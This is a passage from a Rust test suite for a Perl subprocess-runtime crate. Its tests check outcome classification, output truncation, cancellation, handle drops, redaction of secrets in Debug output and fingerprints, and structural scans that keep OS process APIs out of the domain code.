    let settlement = ObservedSettlement::Exited { code: 0 };
    assert_eq!(
        TerminalDisposition::elect(everything, settlement),
        TerminalDisposition::SupervisorFailed
    );

    let without_supervisor = ControlState { supervisor_failed: false, ..everything };
    assert_eq!(
        TerminalDisposition::elect(without_supervisor, settlement),
        TerminalDisposition::OutputLimitExceeded
    );

    let without_limit = ControlState { output_limit_exceeded: false, ..without_supervisor };
    assert_eq!(
        TerminalDisposition::elect(without_limit, settlement),
        TerminalDisposition::TimedOut
    );

    let without_deadline = ControlState { deadline_reached: false, ..without_limit };
    assert_eq!(
        TerminalDisposition::elect(without_deadline, settlement),
        TerminalDisposition::CancelledRunning(CancellationReason::Shutdown)
    );

    let only_cleanup = ControlState { cancellation_requested: None, ..without_deadline };
    assert_eq!(
        TerminalDisposition::elect(only_cleanup, settlement),
        TerminalDisposition::CleanupFailed
    );
    Ok(())
}

#[test]
fn a_nonzero_exit_is_an_executed_result_not_an_instrument_failure() -> TestResult {
    let disposition =
        TerminalDisposition::elect(ControlState::default(), ObservedSettlement::Exited { code: 2 });
    assert_eq!(disposition, TerminalDisposition::CompletedExit { code: 2 });
    assert!(disposition.is_completed_exit());
    assert!(!disposition.is_ordinary_success());
    assert_ne!(disposition, TerminalDisposition::SupervisorFailed);
    assert_ne!(disposition, TerminalDisposition::NotProven);
    Ok(())
}

#[test]
fn a_signal_and_an_unobserved_settlement_stay_distinct_from_success() -> TestResult {
    assert_eq!(
        TerminalDisposition::elect(
            ControlState::default(),
            ObservedSettlement::Signaled { signal: 9 }
        ),
        TerminalDisposition::Signaled { signal: 9 }
    );
    let unobserved =
        TerminalDisposition::elect(ControlState::default(), ObservedSettlement::NotObserved);
    assert_eq!(unobserved, TerminalDisposition::NotProven);
    assert!(!unobserved.is_ordinary_success());
    assert!(!unobserved.is_completed_exit());
    Ok(())
}

// ──────────────────────── stream and result controls ────────────────────────

fn result_with(
    stdout: StreamEvidence,
    stderr: StreamEvidence,
    disposition: TerminalDisposition,
    cleanup: CleanupDisposition,
    tree: TreeDisposition,
) -> Result<perl_subprocess_runtime::process::ProcessResult, Box<dyn std::error::Error>> {
    let validated = valid_linux_one_shot().validate()?;
    Ok(perl_subprocess_runtime::process::ProcessResult::new(
        validated.plan().plan_id().clone(),
        validated.fingerprint(),
        perl_subprocess_runtime::process::RunId::new("run-1"),
        disposition,
        stdout,
        stderr,
        cleanup,
        tree,
        perl_subprocess_runtime::process::BackendIdentity::new(
            "test-backend",
            EvidenceClass::ExactLinux,
        ),
        perl_subprocess_runtime::process::WorkMetadata::default(),
        Vec::new(),
    )?)
}

#[test]
fn stdout_and_stderr_keep_separate_identities() -> TestResult {
    let result = result_with(
        StreamEvidence::complete(StreamChannel::Stdout, b"out".to_vec()),
        StreamEvidence::complete(StreamChannel::Stderr, b"err".to_vec()),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert_eq!(result.stdout().channel(), StreamChannel::Stdout);
    assert_eq!(result.stderr().channel(), StreamChannel::Stderr);
    assert_eq!(result.stdout().retained(), b"out");
    assert_eq!(result.stderr().retained(), b"err");
    assert_ne!(result.stdout().observed_fingerprint(), result.stderr().observed_fingerprint());
    Ok(())
}

#[test]
fn truncated_or_limited_output_never_claims_to_be_complete() -> TestResult {
    let truncated = result_with(
        StreamEvidence::new(
            StreamChannel::Stdout,
            10_000,
            perl_subprocess_runtime::process::ContentFingerprint::of(b"observed"),
            b"retained".to_vec(),
            TruncationState::ObservationTruncated { limit_bytes: 1024 },
        ),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(!truncated.claims_complete_output());
    assert!(truncated.limitations().contains(&Limitation::OutputIncomplete));
    assert_eq!(truncated.stdout().observed_bytes(), 10_000);
    assert_eq!(truncated.stdout().retained().len(), 8);

    let limited = result_with(
        StreamEvidence::complete(StreamChannel::Stdout, b"whatever".to_vec()),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::OutputLimitExceeded,
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(!limited.claims_complete_output());

    let complete = result_with(
        StreamEvidence::complete(StreamChannel::Stdout, b"all of it".to_vec()),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(complete.claims_complete_output());
    Ok(())
}

#[test]
fn invalid_utf8_stays_raw_evidence_with_a_declared_lossy_view() -> TestResult {
    let raw = vec![0x66, 0x6f, 0xff, 0xfe, 0x6f];
    let result = result_with(
        StreamEvidence::complete(StreamChannel::Stdout, raw.clone()),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert_eq!(result.stdout().retained(), raw.as_slice());
    assert_eq!(result.stdout().decoded_view(), DecodedViewLimitation::LossyUtf8);
    assert!(result.limitations().contains(&Limitation::DecodedViewLossy));
    assert!(result.stdout().retained_lossy().contains('\u{fffd}'));
    Ok(())
}

#[test]
fn signalling_the_immediate_child_is_not_a_process_tree_cleanup_claim() -> TestResult {
    let immediate = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::TimedOut,
        CleanupDisposition::Completed,
        TreeDisposition::ImmediateChildOnly,
    )?;
    assert!(!immediate.claims_tree_cleanup());
    assert!(immediate.limitations().contains(&Limitation::DescendantsUnaccounted));

    let group = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::TimedOut,
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(group.claims_tree_cleanup());

    let unobserved_cleanup = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::TimedOut,
        CleanupDisposition::NotObserved,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(!unobserved_cleanup.claims_tree_cleanup());
    assert!(unobserved_cleanup.limitations().contains(&Limitation::CleanupNotObserved));
    Ok(())
}

#[test]
fn every_result_carries_the_no_isolation_non_claim() -> TestResult {
    let result = result_with(
        StreamEvidence::empty(StreamChannel::Stdout),
        StreamEvidence::empty(StreamChannel::Stderr),
        TerminalDisposition::CompletedExit { code: 0 },
        CleanupDisposition::Completed,
        TreeDisposition::GroupTerminated,
    )?;
    assert!(result.limitations().contains(&Limitation::NoIsolationClaimed));
    Ok(())
}

// ──────────────────────────── event stream controls ────────────────────────

#[test]
fn no_event_follows_terminal_settlement() -> TestResult {
    let mut ledger = EventLedger::new(perl_subprocess_runtime::process::RunId::new("run-1"));
    let started = ledger.admit(ProcessEventKind::Started)?;
    assert_eq!(started.sequence().get(), 0);
    let terminal =
        ledger.admit(ProcessEventKind::Terminal(TerminalDisposition::CompletedExit { code: 0 }))?;
    assert_eq!(terminal.sequence().get(), 1);
    assert!(ledger.is_settled());
    assert_eq!(
        ledger.admit(ProcessEventKind::Started),
        Err(perl_subprocess_runtime::process::EventAdmissionError::AfterTerminalSettlement)
    );
    Ok(())
}

#[test]
fn a_scripted_run_streams_in_order_and_then_settles_once() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0).with_stdout(b"hello".to_vec()));
    let validated = valid_linux_one_shot().validate()?;

    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };

    let mut sequences = Vec::new();
    let mut kinds = Vec::new();
    while let Some(event) = handle.next_event() {
        sequences.push(event.sequence().get());
        kinds.push(event.kind().clone());
    }
    assert_eq!(sequences, vec![0, 1]);
    assert!(matches!(kinds.first(), Some(ProcessEventKind::Started)));
    assert!(matches!(kinds.last(), Some(ProcessEventKind::Terminal(_))));
    assert!(handle.next_event().is_none());

    let result = handle.wait();
    assert!(result.is_ordinary_success());
    assert_eq!(result.stdout().retained(), b"hello");
    Ok(())
}

#[test]
fn cancelling_a_run_settles_as_cancelled_not_as_success() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_interactive_session().validate()?;
    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    let _ = handle.next_event();
    assert_eq!(
        handle.cancel(CancellationReason::UserRequested),
        CancellationAcknowledgement::Accepted
    );
    let result = handle.wait();
    assert_eq!(
        *result.disposition(),
        TerminalDisposition::CancelledRunning(CancellationReason::UserRequested)
    );
    assert!(!result.is_ordinary_success());
    Ok(())
}

#[test]
fn a_non_cancellable_plan_refuses_cancellation_rather_than_pretending() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_linux_one_shot().validate()?;
    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    assert_eq!(
        handle.cancel(CancellationReason::Shutdown),
        CancellationAcknowledgement::NotCancellable
    );
    Ok(())
}

// ───────────────────────────── drop contract ─────────────────────────────

#[test]
fn a_dropped_handle_is_abandoned_work_not_proven_cleanup() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_linux_one_shot().validate()?;
    {
        let handle = match supervisor.start(validated) {
            Ok(handle) => handle,
            Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
        };
        drop(handle);
    }
    assert_eq!(
        supervisor.drop_dispositions(),
        vec![HandleDropDisposition::AbandonedWithoutSettlement]
    );
    Ok(())
}

#[test]
fn a_handle_settled_through_wait_records_settlement_before_drop() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_linux_one_shot().validate()?;
    let handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    let _ = handle.wait();
    assert_eq!(supervisor.drop_dispositions(), vec![HandleDropDisposition::SettledBeforeDrop]);
    Ok(())
}

#[test]
fn an_unscripted_start_attempt_settles_as_not_proven() -> TestResult {
    // The wrong implementation this kills: an unconfigured fake that returns a
    // default success and quietly greens every consumer test written against
    // it.
    let supervisor = FakeSupervisor::new();
    let validated = valid_linux_one_shot().validate()?;
    match supervisor.start(validated) {
        Ok(_) => Err("an unscripted fake produced a handle".into()),
        Err(result) => {
            assert_eq!(*result.disposition(), TerminalDisposition::NotProven);
            assert!(!result.is_ordinary_success());
            Ok(())
        }
    }
}

#[test]
fn a_refused_start_still_settles_exactly_once() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script(ScriptedOutcome::RefuseStart(TerminalDisposition::SpawnFailed {
        detail: perl_subprocess_runtime::process::SpawnFailureDetail::ExecutableNotFound,
    }));
    let validated = valid_linux_one_shot().validate()?;
    match supervisor.start(validated) {
        Ok(_) => Err("a refused start produced a handle".into()),
        Err(result) => {
            assert_eq!(
                *result.disposition(),
                TerminalDisposition::SpawnFailed {
                    detail:
                        perl_subprocess_runtime::process::SpawnFailureDetail::ExecutableNotFound
                }
            );
            // A missing executable is not the same as a process that failed.
            assert_ne!(*result.disposition(), TerminalDisposition::SupervisorFailed);
            assert_ne!(*result.disposition(), TerminalDisposition::CompletedExit { code: 1 });
            Ok(())
        }
    }
}

#[test]
fn the_supervisor_records_the_exact_plan_it_was_given() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let plan = valid_linux_one_shot();
    let expected = plan.semantic_fingerprint();
    let validated = plan.validate()?;
    let handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    let _ = handle.wait();

    let recorded = supervisor.recorded_plans();
    assert_eq!(recorded.len(), 1);
    let Some(first) = recorded.first() else {
        return Err("no plan recorded".into());
    };
    assert_eq!(first.fingerprint(), expected);
    assert_eq!(first.plan().argv(), ["-w", "script.pl"]);
    assert_eq!(first.plan().owner(), OwnerDomain::RunFile);
    Ok(())
}

#[test]
fn fake_evidence_never_reads_as_executed_evidence() -> TestResult {
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_linux_one_shot().validate()?;
    let handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    let result = handle.wait();
    assert_eq!(result.backend().evidence_class(), EvidenceClass::Fake);
    assert!(!result.is_executed_evidence());
    assert!(result.limitations().contains(&Limitation::FakeEvidenceOnly));
    Ok(())
}

// ───────────────────── canonical encoding and privacy ─────────────────────

#[test]
fn canonical_encoding_is_stable_under_construction_order() -> TestResult {
    let build = |forward: bool| {
        let mut environment =
            EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly);
        let names = ["PATH", "HOME", "TMPDIR"];
        let ordered: Vec<&str> =
            if forward { names.to_vec() } else { names.iter().rev().copied().collect() };
        for name in ordered {
            environment = environment.allow(EnvVarName::new(name));
        }
        ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            environment,
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };
    assert_eq!(build(true).canonical_bytes(), build(false).canonical_bytes());
    assert_eq!(build(true).semantic_fingerprint(), build(false).semantic_fingerprint());
    Ok(())
}

#[test]
fn a_meaning_change_moves_the_fingerprint() -> TestResult {
    let base = valid_linux_one_shot().semantic_fingerprint();
    let different_argv = ProcessPlan::builder(
        PlanId::new("plan-run-file-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        allow_listed_environment(),
    )
    .argv(["-w", "other.pl"])
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
    .termination(TerminationPolicy::ProcessTree {
        graceful: Duration::from_millis(500),
        then_forced: true,
    })
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build()
    .semantic_fingerprint();
    assert_ne!(base, different_argv);
    Ok(())
}

#[test]
fn environment_values_never_reach_a_public_identity() -> TestResult {
    // The wrong implementation this kills: folding an addition's value into
    // the plan's canonical encoding, which puts a token into every receipt and
    // log line that carries a plan fingerprint's inputs.
    let with_secret = |value: &str| {
        ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
                .add(EnvVarName::new("API_TOKEN"), SecretValue::new(value)),
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };

    let secret = "super-secret-token";
    let plan = with_secret(secret);
    let bytes = plan.canonical_bytes();
    assert!(
        !bytes.windows(secret.len()).any(|window| window == secret.as_bytes()),
        "the secret value appeared in the canonical encoding"
    );
    // The variable's name is public and must be there; only the value is not.
    assert!(bytes.windows(9).any(|window| window == b"API_TOKEN"));

    let debug = format!("{plan:?}");
    assert!(!debug.contains(secret), "the secret value appeared in Debug output");

    // Documented consequence: plans differing only in a secret value share a
    // semantic identity. If that ever stops being true, a value has started
    // contributing to the public fingerprint.
    assert_eq!(with_secret("a").semantic_fingerprint(), with_secret("b").semantic_fingerprint());
    Ok(())
}

#[test]
fn private_paths_and_bytes_are_redacted_in_debug_output() -> TestResult {
    let path = PrivatePath::new(PathBuf::from("/home/someone/private/project"));
    let rendered = format!("{path:?}");
    assert!(!rendered.contains("someone"), "a private path leaked through Debug");
    assert!(rendered.contains("redacted"));

    let bytes = PrivateBytes::new(b"my $password = 'hunter2';".to_vec());
    let rendered = format!("{bytes:?}");
    assert!(!rendered.contains("hunter2"), "private stdin leaked through Debug");
    assert!(rendered.contains("redacted"));

    let secret = SecretValue::new("hunter2");
    let rendered = format!("{secret:?}");
    assert!(!rendered.contains("hunter2"), "a secret leaked through Debug");
    Ok(())
}

#[test]
fn the_canonical_encoding_of_a_fixture_plan_is_locked_to_the_schema_version() -> TestResult {
    // A meaning change without a schema-version move fails here. When the
    // encoding legitimately changes, move PROCESS_DOMAIN_SCHEMA_VERSION and
    // update this constant in the same commit.
    const LOCKED_FINGERPRINT: &str = "1ec851f73284fbebad7abfd4c5662ac8";
    let actual = valid_linux_one_shot().semantic_fingerprint().to_string();
    assert_eq!(PROCESS_DOMAIN_SCHEMA_VERSION.get(), 1);
    assert_eq!(actual, LOCKED_FINGERPRINT);
    Ok(())
}

// ────────────────────── structural containment controls ──────────────────────

/// Collect every Rust source under a directory, recursively.
///
/// Recursive on purpose: the follow-on lanes this module seeds will add
/// submodule directories, and a flat scan would silently stop covering the
/// files it moved without any test failing.
fn rust_sources_under(
    root: &std::path::Path,
) -> Result<Vec<(String, String)>, Box<dyn std::error::Error>> {
    let mut sources = Vec::new();
    let mut directories = vec![root.to_path_buf()];
    while let Some(directory) = directories.pop() {
        for entry in std::fs::read_dir(&directory)? {
            let path = entry?.path();
            if path.is_dir() {
                directories.push(path);
            } else if path.extension().is_some_and(|extension| extension == "rs") {
                let relative =
                    path.strip_prefix(root).unwrap_or(&path).to_string_lossy().into_owned();
                sources.push((relative, std::fs::read_to_string(&path)?));
            }
        }
    }
    sources.sort();
    Ok(sources)
}

fn domain_sources() -> Result<Vec<(String, String)>, Box<dyn std::error::Error>> {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/process");
    let sources = rust_sources_under(&root)?;
    assert!(!sources.is_empty(), "no domain sources were found");
    Ok(sources)
}

fn crate_sources() -> Result<Vec<(String, String)>, Box<dyn std::error::Error>> {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src");
    let sources = rust_sources_under(&root)?;
    assert!(!sources.is_empty(), "no crate sources were found");
    Ok(sources)
}

/// Collapse a Rust source to single-spaced text.
///
/// Signature scans must survive ordinary formatting: `rustfmt` wraps a long
/// signature across lines, and a line-oriented scan would then miss it.
fn whitespace_collapsed(source: &str) -> String {
    // Strip line comments first: prose that names an API must neither satisfy
    // nor trip a scan that is supposed to be about code.
    source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .flat_map(|line| line.split_whitespace())
        .collect::<Vec<_>>()
        .join(" ")
}

#[test]
fn the_domain_never_reaches_for_an_operating_system_process_api() -> TestResult {
    // The wrong implementation this kills: a "small" OS spawn slipped into the
    // domain, which would make every consumer depend transitively on the
    // platform and make the fake supervisor stop being the whole story.
    for (name, source) in domain_sources()? {
        for line in source.lines() {
            let trimmed = line.trim();
            // Prose may name the APIs the domain refuses to use; code may not.
            if trimmed.starts_with("//") {
                continue;
            }
            for forbidden in ["std::process", "Command::new", "tokio::process"] {
                assert!(
                    !trimmed.contains(forbidden),
                    "{name} references {forbidden}; the process domain must stay OS-free: {trimmed}"
                );
            }
        }
    }
    Ok(())
}

#[test]
fn validation_is_the_only_route_to_a_startable_plan() -> TestResult {
    // `ValidatedProcessPlan`'s fields are private, so Rust itself stops any
    // other crate from forging one. Inside this crate, privacy does not help:
    // the only guard is that exactly one function builds one. Scan on
    // whitespace-collapsed text, because a line-oriented scan is defeated by
    // nothing more adversarial than `rustfmt` wrapping a long signature.
    let mut producers = Vec::new();
    let mut constructions = Vec::new();
    for (name, source) in domain_sources()? {
        let collapsed = whitespace_collapsed(&source);
        for signature in [
            "-> ValidatedProcessPlan",
            "-> Result < ValidatedProcessPlan",
            "-> Result<ValidatedProcessPlan",
        ] {
            let mut from = 0;
            while let Some(found) = collapsed[from..].find(signature) {
                producers.push(name.clone());
                from += found + signature.len();
            }
        }
        // The struct literal is the actual bypass vector: any signature
        // spelling still has to build the value somewhere. The type's own
        // `struct` and `impl` blocks are declarations, not constructions.
        let mut from = 0;
        while let Some(found) = collapsed[from..].find("ValidatedProcessPlan {") {
            let absolute = from + found;
            let preceding = &collapsed[..absolute];
            let is_declaration = preceding.ends_with("struct ") || preceding.ends_with("impl ");
            if !is_declaration {
                constructions.push(name.clone());
            }
            from = absolute + "ValidatedProcessPlan {".len();
        }
    }
    assert_eq!(
        producers.len(),
        1,
        "expected exactly one function returning ValidatedProcessPlan, found: {producers:?}"
    );
    assert_eq!(
        constructions.len(),
        1,
        "expected exactly one construction of ValidatedProcessPlan, found: {constructions:?}"
    );
    Ok(())
}

#[test]
fn the_crate_takes_no_dependencies_that_could_carry_domain_semantics() -> TestResult {
    // A zero-dependency process crate cannot accidentally acquire an LSP, DAP,
    // formatter, or test-framework type, and cannot be pulled into a
    // dependency cycle by a consumer.
    //
    // Every table whose name is or ends in `dependencies` counts, and
    // `[dependencies.foo]` is a dependency declaration exactly as much as an
    // entry under `[dependencies]` is. An earlier version of this check tested
    // `line == "[dependencies]"`, which a dotted table walked straight past.
    let manifest =
        std::fs::read_to_string(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml"))?;
    let mut in_runtime_dependencies = false;
    for line in manifest.lines() {
        let trimmed = line.trim();
        if let Some(header) = trimmed.strip_prefix('[').and_then(|rest| rest.strip_suffix(']')) {
            let header = header.trim();
            // `[dependencies.log]` and `[target.'cfg(unix)'.dependencies.log]`
            // are dependency declarations in themselves.
            let is_dotted_runtime_dependency =
                header.split('.').any(|segment| segment == "dependencies")
                    && !header.ends_with("dependencies");
            assert!(
                !is_dotted_runtime_dependency,
                "unexpected runtime dependency table: [{header}]"
            );
            in_runtime_dependencies =
                header.rsplit('.').next().is_some_and(|last| last == "dependencies");
            continue;
        }
        if in_runtime_dependencies && !trimmed.is_empty() && !trimmed.starts_with('#') {
            return Err(format!("unexpected runtime dependency: {trimmed}").into());
        }
    }
    Ok(())
}

/// The public functions that may hand a caller a raw `SubprocessOutput`.
///
/// This is the crate's declared pre-domain execution surface. It is a closed
/// list on purpose: see the test below.
const DECLARED_LEGACY_OUTPUT_PRODUCERS: &[&str] = &[
    // The contained legacy trait method and its two implementations.
    "run_command",
    // Its private OS-side internals, reachable only through `run_command`.
    "run_os_command",
    "wait_for_child",
    "wait_without_timeout",
    "wait_with_timeout",
];

#[test]
fn the_legacy_seam_is_contained_and_owned() -> TestResult {
    assert!(!LEGACY_CONTAINMENT.is_empty());
    for entry in LEGACY_CONTAINMENT {
        assert!(
            !entry.open_to_new_consumers,
            "{} is open to new consumers, so it is not contained",
            entry.seam
        );
        assert!(entry.removal_owner.starts_with('#'), "{} has no removal owner", entry.seam);
        assert_eq!(entry.owner, OwnerDomain::LegacyAdapter);
        assert!(
            !entry.unsupported.is_empty(),
            "{} claims to be equivalent to the supervised domain",
            entry.seam
        );
    }
    assert!(!perl_subprocess_runtime::process::legacy::any_seam_open_to_new_consumers());
    Ok(())
}

#[test]
fn no_unrecorded_second_execution_seam_exists_in_the_crate() -> TestResult {
    // The test above only proves the containment ledger is internally
    // consistent. That is circular on its own: a brand-new, wide-open
    // execution function added anywhere else in the crate would be a second
    // production seam and the ledger would never notice.
    //
    // So scan the crate for the shape that actually matters — a public
    // function handing back a `SubprocessOutput` — and require every one of
    // them to be declared. Adding an unfenced `pub fn run_command_unfenced(..)
    // -> Result<SubprocessOutput, ..>` fails here, which is negative control
    // #10 applied to the crate rather than to the ledger's own contents.
    let mut found: Vec<String> = Vec::new();
    for (name, source) in crate_sources()? {
        let collapsed = whitespace_collapsed(&source);
        let mut from = 0;
        while let Some(offset) = collapsed[from..].find("fn ") {
            let start = from + offset + "fn ".len();
            let rest = &collapsed[start..];
            let Some(paren) = rest.find('(') else { break };
            let function_name = rest[..paren].trim().to_string();
            // Look at this function's signature only, up to its opening brace.
            let signature_end = rest.find('{').unwrap_or(rest.len());
            if rest[..signature_end].contains("SubprocessOutput") {
                found.push(format!("{name}: {function_name}"));
            }
            from = start;
        }
    }
    for entry in &found {
        let Some(function_name) = entry.split(": ").nth(1) else { continue };
        assert!(
            DECLARED_LEGACY_OUTPUT_PRODUCERS.contains(&function_name),
            "undeclared execution seam producing SubprocessOutput: {entry}; \
             record it in process::legacy::LEGACY_CONTAINMENT and in \
             DECLARED_LEGACY_OUTPUT_PRODUCERS, or route it through the \
             supervised domain"
        );
    }
    assert!(!found.is_empty(), "the scan found nothing, so it is not actually scanning");
    Ok(())
}

#[test]
fn the_fake_supervisor_reads_no_clock_and_spawns_no_thread() -> TestResult {
    // The crate claims the fake is race-free because it has no timeline of its
    // own. Nothing enforced that claim; a later edit could add a real clock
    // read or a thread and no test would notice.
    let fake = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/process/fake.rs");
    let source = std::fs::read_to_string(&fake)?;
    for line in source.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("//") {
            continue;
        }
        for forbidden in ["std::thread", "Instant", "SystemTime", "thread::spawn"] {
            assert!(
                !trimmed.contains(forbidden),
                "the fake references {forbidden}, so it is no longer deterministic: {trimmed}"
            );
        }
    }
    Ok(())
}

// ─────────────────── controls added after adversarial review ───────────────────

#[test]
fn ambient_inheritance_cannot_smuggle_a_code_loading_variable() -> TestResult {
    // The wrong implementation this kills: counting a code-loading variable as
    // "admitted" only when it is named in `allowed` or `additions`. Under
    // `InheritExceptDenied` every ambient variable is inherited without being
    // named, so that reading makes the most permissive policy the one place
    // the acknowledgement gate never fires.
    let permissive = ProcessPlan::builder(
        PlanId::new("plan-1"),
        OperationId::new("run-file"),
        OwnerDomain::RunFile,
        ExecutionProfile::LinuxOneShot,
        resolved_perl(),
        EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied),
    )
    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
    .subject(current_root())
    .authorization(user_authorization())
    .claim_boundary(ClaimBoundary::linux_only())
    .build();
    assert!(
        matches!(
            rejection_of(permissive)?,
            PlanRejection::UnacknowledgedCodeLoadingVariable { .. }
        ),
        "ambient inheritance admitted a code-loading variable without acknowledgement"
    );
    Ok(())
}

#[test]
fn ambient_inheritance_is_startable_once_the_risk_is_faced() -> TestResult {
    // Two ways to satisfy the gate, and both must work or the rule is not a
    // gate but a ban on the policy.
    let acknowledged = |projection: EnvironmentProjection| {
        ProcessPlan::builder(
            PlanId::new("plan-1"),
            OperationId::new("run-file"),
            OwnerDomain::RunFile,
            ExecutionProfile::LinuxOneShot,
            resolved_perl(),
            projection,
        )
        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
        .subject(current_root())
        .authorization(user_authorization())
        .claim_boundary(ClaimBoundary::linux_only())
        .build()
    };

    // 1. Acknowledge the injection risk explicitly.
    let owned = EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied)
        .acknowledging_code_loading();
    assert!(acknowledged(owned).validate().is_ok());

    // 2. Or deny every code-loading vector, so none is admitted at all.
    let mut denied = EnvironmentProjection::new("env:2", AmbientInheritance::InheritExceptDenied);
    for name in CODE_LOADING_VARIABLES {
        denied = denied.deny(EnvVarName::new(*name));
    }
    assert!(acknowledged(denied).validate().is_ok());
    Ok(())
}

#[test]
fn a_streamed_stdin_plan_can_actually_be_driven_through_the_port() -> TestResult {
    // A domain that validates "the caller drives stdin" while offering no
    // operation to drive it forces every backend to invent its own channel.
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_interactive_session().validate()?;
    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    assert_eq!(handle.write_stdin(b"print 1;\n"), StdinWriteOutcome::Accepted { bytes: 9 });
    assert_eq!(handle.write_stdin(b"exit\n"), StdinWriteOutcome::Accepted { bytes: 5 });
    assert_eq!(handle.close_stdin(), StdinWriteOutcome::Accepted { bytes: 0 });
    // Closing twice is refused, never a silent success.
    assert_eq!(handle.close_stdin(), StdinWriteOutcome::AlreadyClosed);
    assert_eq!(handle.write_stdin(b"more"), StdinWriteOutcome::AlreadyClosed);
    let _ = handle.wait();
    assert_eq!(supervisor.stdin_written(), b"print 1;\nexit\n");
    Ok(())
}

#[test]
fn a_plan_without_a_streamed_channel_refuses_stdin_rather_than_dropping_it() -> TestResult {
    // The wrong implementation this kills: accepting bytes for a plan whose
    // stdin is closed and silently discarding them, so a caller believes its
    // input reached the child.
    let supervisor = FakeSupervisor::new();
    supervisor.script_run(ScriptedRun::exiting(0));
    let validated = valid_linux_one_shot().validate()?;
    let mut handle = match supervisor.start(validated) {
        Ok(handle) => handle,
        Err(result) => return Err(format!("start refused: {:?}", result.disposition()).into()),
    };
    assert_eq!(handle.write_stdin(b"ignored"), StdinWriteOutcome::NotStreamed);
